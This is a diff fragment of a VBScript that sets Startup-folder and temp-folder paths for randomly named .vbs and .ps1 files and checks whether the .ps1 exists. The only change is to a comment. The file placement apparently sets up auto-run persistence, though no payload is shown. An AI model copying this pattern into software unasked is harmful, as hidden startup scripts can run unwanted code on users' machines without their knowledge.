@@ -17,7 +17,7 @@ destPath = startupPath & "\BootScript.vbs"
 notepadScriptPath = startupPath & "\wtc9AACOD031020.vbs"
 psScriptPath = tempFolder & "\wtc9AACOD031020.ps1"
 
-' Check to see if NotepadMessage.p1 exist
+' Check to see if wtc9AACOD031020.ps1 exist
 filePath = psScriptPath
 'Set fso = CreateObject("Scripting.FileSystemObject")
 If fso.FileExists(filePath) Then
